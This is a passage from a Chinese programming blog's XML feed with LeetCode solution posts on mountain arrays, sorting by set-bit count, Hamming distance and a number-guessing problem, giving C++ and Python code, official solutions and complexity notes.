<center>💎💎💎💎💎💎💎💎💎💎💎💎💎💎💎官 方 题 解💎💎💎💎💎💎💎💎💎💎💎💎💎💎💎</center>

<h6 id="官方题解："><a href="#官方题解：" class="headerlink" title="官方题解："></a><a href="https://leetcode-cn.com/problems/valid-mountain-array/solution/you-xiao-de-shan-mai-shu-zu-by-leetcode-solution/">官方题解：</a></h6><p><strong>方法一：线性扫描</strong></p>
<p>按题意模拟即可。我们从数组的最左侧开始向右扫描，直到找到第一个不满足 $A[i] &lt; A[i + 1]$ 的下标$i$，那么 $i$ 就是这个数组的最高点的下标。如果 $i = 0$ 或者不存在这样的 $i$（即整个数组都是单调递增的），那么就返回 $false$。否则从 $i$ 开始继续向右扫描，判断接下来的的下标 $j$ 是否都满足 $A[j] &gt; A[j + 1]$，若都满足就返回 $true$，否则返回 $false$。</p>
<p><strong>代码</strong>（执行用时60ms，击败81.85%，内存21.1M，击败5.27%）</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">bool</span> <span class="title">validMountainArray</span><span class="params">(<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&amp; A)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> N = A.size();</span><br><span class="line">        <span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 递增扫描</span></span><br><span class="line">        <span class="keyword">while</span> (i + <span class="number">1</span> &lt; N &amp;&amp; A[i] &lt; A[i + <span class="number">1</span>]) &#123;</span><br><span class="line">            i++;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 最高点不能是数组的第一个位置或最后一个位置</span></span><br><span class="line">        <span class="keyword">if</span> (i == <span class="number">0</span> || i == N - <span class="number">1</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 递减扫描</span></span><br><span class="line">        <span class="keyword">while</span> (i + <span class="number">1</span> &lt; N &amp;&amp; A[i] &gt; A[i + <span class="number">1</span>]) &#123;</span><br><span class="line">            i++;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> i == N - <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p><strong>复杂度分析</strong></p>
<ul>
<li><strong>时间复杂度：</strong>$O(N)$，其中 $N$ 是数组 $A$ 的长度。</li>
<li><strong>空间复杂度：</strong>$O(1)$。</li>
</ul>
<center>⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳总 结⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳</center>

<h6 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h6><p>我的解题思路和官方题解是一样的，只不过官方题解代码可能更简洁清楚一些。感觉官方题解挺好的啊，为什么效率还没我的高呢😅</p>
]]></content>
      <categories>
        <category>ACM</category>
        <category>LeetCode</category>
      </categories>
      <tags>
        <tag>算法</tag>
        <tag>简单</tag>
      </tags>
  </entry>
  <entry>
    <title>根据数字二进制下1的数目排序</title>
    <url>/2020/11/06/%E6%A0%B9%E6%8D%AE%E6%95%B0%E5%AD%97%E4%BA%8C%E8%BF%9B%E5%88%B6%E4%B8%8B1%E7%9A%84%E6%95%B0%E7%9B%AE%E6%8E%92%E5%BA%8F/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p><strong><a href="https://leetcode-cn.com/problems/sort-integers-by-the-number-of-1-bits/">题目地址</a></strong></p>
<p><strong>题目名称：</strong>根据数字二进制下1的数目排序</p>
<p><strong>难度：</strong>⭐</p>
<h6 id="题目描述："><a href="#题目描述：" class="headerlink" title="题目描述："></a><strong>题目描述：</strong></h6><p>给你一个整数数组 <code>arr</code> 。请你将数组中的元素按照其二进制表示中数字 <strong>1</strong> 的数目升序排序。</p>
<p>如果存在多个数字二进制中 <code>1</code> 的数目相同，则必须将它们按照数值大小升序排列。</p>
<p>请你返回排序后的数组。</p>
<a id="more"></a>
<p><strong>示例1：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：arr &#x3D; [0,1,2,3,4,5,6,7,8]</span><br><span class="line">输出：[0,1,2,4,8,3,5,6,7]</span><br><span class="line">解释：[0] 是唯一一个有 0 个 1 的数。</span><br><span class="line">[1,2,4,8] 都有 1 个 1 。</span><br><span class="line">[3,5,6] 有 2 个 1 。</span><br><span class="line">[7] 有 3 个 1 。</span><br><span class="line">按照 1 的个数排序得到的结果数组为 [0,1,2,4,8,3,5,6,7]</span><br></pre></td></tr></table></figure>
<p><strong>示例2：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：-123输入：arr &#x3D; [1024,512,256,128,64,32,16,8,4,2,1]</span><br><span class="line">输出：[1,2,4,8,16,32,64,128,256,512,1024]</span><br><span class="line">解释：数组中所有整数二进制下都只有 1 个 1 ，所以你需要按照数值大小将它们排序。</span><br></pre></td></tr></table></figure>
<p><strong>示例3：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：arr &#x3D; [10000,10000]</span><br><span class="line">输出：[10000,10000]</span><br></pre></td></tr></table></figure>
<p><strong>示例4：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：arr &#x3D; [2,3,5,7,11,13,17,19]</span><br><span class="line">输出：[2,3,5,17,7,11,13,19]</span><br></pre></td></tr></table></figure>
<p><strong>示例5：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：arr &#x3D; [10,100,1000,10000]</span><br><span class="line">输出：[10,100,10000,1000]</span><br></pre></td></tr></table></figure>
<p><strong>提示：</strong></p>
<ul>
<li><code>1 &lt;= arr.length &lt;= 500</code></li>
<li><code>0 &lt;= arr[i] &lt;= 10^4</code></li>
</ul>
<center>🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️解题过程🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️</center>

<h6 id="解题过程："><a href="#解题过程：" class="headerlink" title="解题过程："></a>解题过程：</h6><p><strong>思路：</strong></p>
<p>最直观的解法，遍历数组arr，对每一个元素计算二进制表示中1的个数，用一个数组存储相应的个数，然后冒泡排序，最会返回arr</p>
<p><strong>c++代码：</strong>（执行104ms，击败5.42%，内存10.2M，击败30.68%）</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; <span class="title">sortByBits</span><span class="params">(<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&amp; arr)</span> </span>&#123;</span><br><span class="line">        <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; num;</span><br><span class="line">        <span class="keyword">int</span> bit_num;</span><br><span class="line">        <span class="keyword">int</span> i,j,tmp;</span><br><span class="line">        <span class="comment">//得到arr数组中每个元素二进制中1的个数</span></span><br><span class="line">        <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;arr.size();++i)&#123;</span><br><span class="line">            bit_num=<span class="number">0</span>;</span><br><span class="line">            <span class="comment">//计算二进制中1的个数</span></span><br><span class="line">            tmp=arr[i];</span><br><span class="line">            <span class="keyword">while</span>(tmp)&#123;</span><br><span class="line">                <span class="keyword">if</span>(tmp &amp; <span class="number">1</span>)&#123;</span><br><span class="line">                    ++bit_num;</span><br><span class="line">                &#125;</span><br><span class="line">                tmp&gt;&gt;=<span class="number">1</span>;<span class="comment">//右移1位</span></span><br><span class="line">            &#125;</span><br><span class="line">            num.push_back(bit_num);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//对num容器中元素冒泡排序,还可以调用sort方法排序？</span></span><br><span class="line">        <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;num.size();++i)&#123;</span><br><span class="line">            <span class="keyword">for</span>(j=<span class="number">0</span>;j&lt;num.size()-i<span class="number">-1</span>;++j)&#123;</span><br><span class="line">                <span class="comment">//二进制中1的数目前者比后者大或者数目相同但前者数值大，交换位置</span></span><br><span class="line">                <span class="keyword">if</span>(num[j]&gt;num[j+<span class="number">1</span>] || (num[j]==num[j+<span class="number">1</span>] &amp;&amp; arr[j]&gt;arr[j+<span class="number">1</span>]))&#123;</span><br><span class="line">                    tmp=num[j];</span><br><span class="line">                    num[j]=num[j+<span class="number">1</span>];</span><br><span class="line">                    num[j+<span class="number">1</span>]=tmp;</span><br><span class="line">					<span class="comment">//arr数组排序</span></span><br><span class="line">                    tmp=arr[j];</span><br><span class="line">                    arr[j]=arr[j+<span class="number">1</span>];</span><br><span class="line">                    arr[j+<span class="number">1</span>]=tmp;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="keyword">return</span> arr;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<center>💎💎💎💎💎💎💎💎💎💎💎💎💎💎💎官 方 题 解💎💎💎💎💎💎💎💎💎💎💎💎💎💎💎</center>

<h6 id="官方题解："><a href="#官方题解：" class="headerlink" title="官方题解："></a>官方题解：</h6><h4 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h4><p>题目本身很简单，只要调用系统自带的排序函数，然后自己改写一下排序规则即可，所以这里主要讲讲如何计算数字二进制下 1 的个数 。</p>
<p><strong>方法一：暴力</strong>（执行20ms，击败87%，内存14M，击败5.04%）</p>
<p>对每个十进制的数转二进制的时候统计一下 1 的个数即可。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">get</span><span class="params">(<span class="keyword">int</span> x)</span></span>&#123;</span><br><span class="line">        <span class="keyword">int</span> res = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span> (x) &#123;</span><br><span class="line">            res += (x % <span class="number">2</span>);</span><br><span class="line">            x /= <span class="number">2</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; <span class="title">sortByBits</span><span class="params">(<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&amp; arr)</span> </span>&#123;</span><br><span class="line">        <span class="function"><span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; <span class="title">bit</span><span class="params">(<span class="number">10001</span>, <span class="number">0</span>)</span></span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">auto</span> x: arr) &#123;</span><br><span class="line">            bit[x] = get(x);</span><br><span class="line">        &#125;</span><br><span class="line">        sort(arr.begin(),arr.end(),[&amp;](<span class="keyword">int</span> x,<span class="keyword">int</span> y)&#123;</span><br><span class="line">            <span class="keyword">if</span> (bit[x] &lt; bit[y]) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (bit[x] &gt; bit[y]) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> x &lt; y;</span><br><span class="line">        &#125;);</span><br><span class="line">        <span class="keyword">return</span> arr;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p><strong>复杂度分析</strong></p>
<ul>
<li><strong>时间复杂度：</strong>$O(nlogn)$，其中 $n$ 为整数数组 <code>arr</code> 的长度。</li>
<li><strong>空间复杂度：</strong>$O(n)$，其中 $n$ 为整数数组 <code>arr</code> 的长度。</li>
</ul>
<p><strong>方法二：递推预处理</strong>（执行16M，击败90.64%，内存14M，击败5.14%）<br>我们定义 $bit[i]$ 为数字 $i$ 二进制表示下数字 1 的个数，则可以列出递推式：</p>
<p>​                                                        <script type="math/tex">bit[i] = bit[i>>1] + (i \& 1)</script></p>
<p>所以我们线性预处理 $bit$ 数组然后去排序即可。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; <span class="title">sortByBits</span><span class="params">(<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&amp; arr)</span> </span>&#123;</span><br><span class="line">        <span class="function"><span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; <span class="title">bit</span><span class="params">(<span class="number">10001</span>, <span class="number">0</span>)</span></span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>;i &lt;= <span class="number">10000</span>; ++i) &#123;</span><br><span class="line">            bit[i] = bit[i&gt;&gt;<span class="number">1</span>] + (i &amp; <span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        sort(arr.begin(),arr.end(),[&amp;](<span class="keyword">int</span> x,<span class="keyword">int</span> y)&#123;</span><br><span class="line">            <span class="keyword">if</span> (bit[x] &lt; bit[y]) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (bit[x] &gt; bit[y]) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> x &lt; y;</span><br><span class="line">        &#125;);</span><br><span class="line">        <span class="keyword">return</span> arr;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p><strong>复杂度分析</strong></p>
<ul>
<li><strong>时间复杂度：</strong>$O(nlogn)$，其中 $n$ 为整数数组 <code>arr</code> 的长度。</li>
<li><strong>空间复杂度：</strong>$O(n)$，其中 $n$ 为整数数组 arr 的长度。</li>
</ul>
<center>🎓🎓🎓🎓🎓🎓🎓🎓🎓🎓🎓🎓🎓🎓🎓知 识 点🎓🎓🎓🎓🎓🎓🎓🎓🎓🎓🎓🎓🎓🎓🎓</center>

<h6 id="知识点："><a href="#知识点：" class="headerlink" title="知识点："></a>知识点：</h6><ul>
<li>整数二进制表示中1的个数计算</li>
<li>调用系统排序函数，修改排序规则</li>
</ul>
<center>⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳总 结⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳</center>

<h6 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h6><p>官方题解是采用了空间换时间的做法，虽然执行用时很少，但是内存消耗太高了。在成员函数中重写sort函数排序规则这是我没想到的，学到了🤩</p>
]]></content>
      <categories>
        <category>ACM</category>
        <category>LeetCode</category>
      </categories>
      <tags>
        <tag>算法</tag>
        <tag>简单</tag>
      </tags>
  </entry>
  <entry>
    <title>汉明距离</title>
    <url>/2020/11/10/%E6%B1%89%E6%98%8E%E8%B7%9D%E7%A6%BB/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p><strong><a href="https://leetcode-cn.com/problems/hamming-distance/">题目地址</a></strong></p>
<p><strong>难度：</strong>⭐</p>
<h6 id="题目描述："><a href="#题目描述：" class="headerlink" title="题目描述："></a><strong>题目描述：</strong></h6><p>两个整数之间的<a href="https://baike.baidu.com/item/汉明距离">汉明距离</a>指的是这两个数字对应二进制位不同的位置的数目。</p>
<p>给出两个整数 <code>x</code> 和 <code>y</code>，计算它们之间的汉明距离。</p>
<a id="more"></a>
<p><strong>示例：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入: x &#x3D; 1, y &#x3D; 4</span><br><span class="line"></span><br><span class="line">输出: 2</span><br><span class="line"></span><br><span class="line">解释:</span><br><span class="line">1   (0 0 0 1)</span><br><span class="line">4   (0 1 0 0)</span><br><span class="line">       ↑   ↑</span><br><span class="line"></span><br><span class="line">上面的箭头指出了对应二进制位不同的位置。</span><br></pre></td></tr></table></figure>
<p><strong>注意：</strong></p>
<ul>
<li>0 ≤ <code>x</code>, <code>y</code> &lt; $2^{31}$​.</li>
</ul>
<center>🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️解题过程🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️</center>

<h6 id="解题过程："><a href="#解题过程：" class="headerlink" title="解题过程："></a>解题过程：</h6><p><strong>思路：</strong></p>
<p>其实就是两个整数异或运算，得到的结果二进制位相加就是汉明距离。</p>
<p><strong>c++代码：</strong>(执行用时4ms，击败26.92%，内存消耗6.3M，击败5.02%）</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">hammingDistance</span><span class="params">(<span class="keyword">int</span> x, <span class="keyword">int</span> y)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> result=<span class="number">0</span>;</span><br><span class="line">        <span class="comment">//也就是求两个数字异或结果的二进制各位相加</span></span><br><span class="line">        <span class="keyword">int</span> tmp=x^y;</span><br><span class="line">        <span class="keyword">while</span>(tmp)&#123;</span><br><span class="line">            result+=tmp%<span class="number">2</span>;</span><br><span class="line">            tmp/=<span class="number">2</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<center>💎💎💎💎💎💎💎💎💎💎💎💎💎💎💎官 方 题 解💎💎💎💎💎💎💎💎💎💎💎💎💎💎💎</center>

<h6 id="官方题解"><a href="#官方题解" class="headerlink" title="官方题解:"></a><a href="https://leetcode-cn.com/problems/hamming-distance/solution/yi-ming-ju-chi-by-leetcode/">官方题解</a>:</h6><p><strong>思路</strong><br>汉明距离广泛应用于多个领域。在编码理论中用于错误检测，在信息论中量化字符串之间的差异。</p>
<p>两个整数之间的汉明距离是对应位置上数字不同的位数。</p>
<p>根据以上定义，提出一种 <a href="https://baike.baidu.com/item/%E5%BC%82%E6%88%96">XOR</a> 的位运算，当且仅当输入位不同时输出为 1。</p>
<p><img src="/2020/11/10/%E6%B1%89%E6%98%8E%E8%B7%9D%E7%A6%BB/461_XOR.png" alt="img"></p>
<p>计算 <code>x</code> 和 <code>y</code> 之间的汉明距离，可以先计算 <code>x XOR y</code>，然后统计结果中等于 1 的位数。</p>
<p>现在，原始问题转换为位计数问题。位计数有多种思路，将在下面的方法中介绍。</p>
<p><strong>方法一：内置位计数功能</strong></p>
<p><strong>思路</strong></p>
<p>大多数编程语言中，都存在各种内置计算等于 1 的位数函数。如果这是一个项目中的问题，应该直接使用内置函数，而不是重复造轮子。</p>
<p>但这是一个力扣问题，有人会认为使用内置函数就好像使用 使用 LinkedList 实现 LinkedList。对此，我们完全赞同。因此后面会有手工实现的位计数算法。</p>
<p><strong>python代码：</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">hammingDistance</span>(<span class="params">self, x: int, y: int</span>) -&gt; int:</span></span><br><span class="line">        <span class="keyword">return</span> bin(x ^ y).count(<span class="string">&#x27;1&#x27;</span>)</span><br></pre></td></tr></table></figure>
<p><strong>复杂度分析</strong></p>
<ul>
<li><p>时间复杂度：$O(1)$。</p>
</li>
<li><p>该算法有两个操作。计算 XOR 花费恒定时间。</p>
</li>
<li><p>调用内置的 bitCount 函数。最坏情况下，该函数复杂度为$O(k)$，其中 $k$ 是整数的位数。在 Python 和 Java 中 Integer 是固定长度的。因此该算法复杂度恒定，与输入大小无关。</p>
</li>
<li><p>空间复杂度：$O(1)$，使用恒定大小的空间保存 XOR 的结果。</p>
<ul>
<li>假设内置函数也使用恒定空间。</li>
</ul>
</li>
</ul>
<p><strong>方法二：移位</strong></p>
<p><strong>思路</strong></p>
<p>为了计算等于 <code>1</code> 的位数，可以将每个位移动到最左侧或最右侧，然后检查该位是否为 <code>1</code>。</p>
<p>更准确的说，应该进行逻辑移位，移入零替换丢弃的位。</p>
<p><img src="/2020/11/10/%E6%B1%89%E6%98%8E%E8%B7%9D%E7%A6%BB/461_shift.png" alt="img"></p>
<p>这里采用右移位，每个位置都会被移动到最右边。移位后检查最右位的位是否为 <code>1</code> 即可。检查最右位是否为 <code>1</code>，可以使用取模运算<code>（i % 2）</code>或者 AND 操作<code>（i &amp; 1）</code>，这两个操作都会屏蔽最右位以外的其他位。</p>
<p><strong>python代码：</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>(<span class="params">object</span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">hammingDistance</span>(<span class="params">self, x, y</span>):</span></span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        :type x: int</span></span><br><span class="line"><span class="string">        :type y: int</span></span><br><span class="line"><span class="string">        :rtype: int</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        xor = x ^ y</span><br><span class="line">        distance = <span class="number">0</span></span><br><span class="line">        <span class="keyword">while</span> xor:</span><br><span class="line">            <span class="comment"># mask out the rest bits</span></span><br><span class="line">            <span class="keyword">if</span> xor &amp; <span class="number">1</span>:</span><br><span class="line">                distance += <span class="number">1</span></span><br><span class="line">            xor = xor &gt;&gt; <span class="number">1</span></span><br><span class="line">        <span class="keyword">return</span> distance</span><br></pre></td></tr></table></figure>
<p><strong>复杂度分析</strong></p>
<ul>
<li><p>时间复杂度：$O(1)$，在 Python 和 Java 中 Integer 的大小是固定的，处理时间也是固定的。 32 位整数需要 32 次迭代。</p>
</li>
<li><p>空间复杂度：$O(1)$，使用恒定大小的空间。</p>
</li>
</ul>
<p><strong>方法三：布赖恩·克尼根算法</strong></p>
<p><strong>思路</strong></p>
<p>方法二是逐位移动，逐位比较边缘位置是否为 1。寻找一种更快的方法找出等于 1 的位数。</p>
<p>是否可以像人类直观的计数比特为 1 的位数，跳过两个 1 之间的 0。例如：<code>10001000</code>。</p>
<p>上面例子中，遇到最右边的 1 后，如果可以跳过中间的 0，直接跳到下一个 1，效率会高很多。</p>
<p>这是布赖恩·克尼根位计数算法的基本思想。该算法使用特定比特位和算术运算移除等于 1 的最右比特位。</p>
<p>当我们在 <code>number</code> 和 <code>number-1</code> 上做 AND 位运算时，原数字 <code>number</code> 的最右边等于 1 的比特会被移除。</p>
<p><img src="/2020/11/10/%E6%B1%89%E6%98%8E%E8%B7%9D%E7%A6%BB/461_brian.png" alt="img"></p>
<p>基于以上思路，通过 2 次迭代就可以知道 <code>10001000</code> 中 1 的位数，而不需要 8 次。</p>
<p><strong>python代码：</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">hammingDistance</span>(<span class="params">self, x, y</span>):</span></span><br><span class="line">        xor = x ^ y</span><br><span class="line">        distance = <span class="number">0</span></span><br><span class="line">        <span class="keyword">while</span> xor:</span><br><span class="line">            distance += <span class="number">1</span></span><br><span class="line">            <span class="comment"># remove the rightmost bit of &#x27;1&#x27;</span></span><br><span class="line">            xor = xor &amp; (xor - <span class="number">1</span>)</span><br><span class="line">        <span class="keyword">return</span> distance</span><br></pre></td></tr></table></figure>
<p>注意：该算法发布在 1988 年 《C 语言编程第二版》的练习中（由 <strong>Brian W. Kernighan</strong> 和 Dennis M. Ritchie 编写），但是 Donald Knuth 在 2006 年 4 月 19 日指出，该方法第一次是由 Peter Wegner 在 1960 年的 CACM3 上出版。顺便说一句，可以在上述书籍中找到更多位操作的技巧。</p>
<p><strong>复杂度分析</strong></p>
<ul>
<li><p>时间复杂度：$O(1)$。</p>
<ul>
<li>与移位方法相似，由于整数的位数恒定，因此具有恒定的时间复杂度。</li>
</ul>
</li>
</ul>
<ul>
<li>但是该方法需要的迭代操作更少。</li>
</ul>
<ul>
<li>空间复杂度：$O(1)$，与输入无关，使用恒定大小的空间。</li>
</ul>
<center>⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳总 结⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳</center>

<h6 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h6><p>官方题解怎么都是python或者java代码，虽然python和java我都会，但是我现在在学c++，还是全部用c++实现吧，可以借鉴官方题解的算法思想😗</p>
]]></content>
      <categories>
        <category>ACM</category>
        <category>LeetCode</category>
      </categories>
      <tags>
        <tag>算法</tag>
        <tag>简单</tag>
      </tags>
  </entry>
  <entry>
    <title>猜数字</title>
    <url>/2020/11/05/%E7%8C%9C%E6%95%B0%E5%AD%97/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p><a href="https://leetcode-cn.com/problems/guess-numbers/"><strong>题目地址</strong></a></p>
<p><strong>难度：</strong>⭐</p>
<h6 id="题目描述："><a href="#题目描述：" class="headerlink" title="题目描述："></a><strong>题目描述：</strong></h6><p>小A 和 小B 在玩猜数字。小B 每次从 1, 2, 3 中随机选择一个，小A 每次也从 1, 2, 3 中选择一个猜。他们一共进行三次这个游戏，请返回 小A 猜对了几次？</p>
<p>输入的<code>guess</code>数组为 小A 每次的猜测，<code>answer</code>数组为 小B 每次的选择。<code>guess</code>和<code>answer</code>的长度都等于3。</p>
<a id="more"></a>
<p><strong>示例1：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：guess &#x3D; [1,2,3], answer &#x3D; [1,2,3]</span><br><span class="line">输出：3</span><br><span class="line">解释：小A 每次都猜对了。</span><br></pre></td></tr></table></figure>
<p><strong>示例2：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：guess &#x3D; [2,2,3], answer &#x3D; [3,2,1]</span><br><span class="line">输出：1</span><br><span class="line">解释：小A 只猜对了第二次。</span><br></pre></td></tr></table></figure>
<p><strong>限制：</strong></p>
<ol>
<li><code>guess</code>的长度 = 3</li>
<li><code>answer</code>的长度 = 3</li>
<li><code>guess</code>的元素取值为 <code>&#123;1, 2, 3&#125;</code> 之一。</li>
<li><code>answer</code>的元素取值为 <code>&#123;1, 2, 3&#125;</code> 之一。</li>
</ol>
<center>🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️解题过程🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️</center>

<h6 id="解题过程："><a href="#解题过程：" class="headerlink" title="解题过程："></a>解题过程：</h6><p><strong>思路：</strong></p>
<p>这应该是最简单的题了吧🤣，直接遍历判断两个容器值是否相等。</p>
<p><strong>c++代码：</strong>(执行用时0ms，击败100%，内存消耗6.6M，击败5.03%）</p>
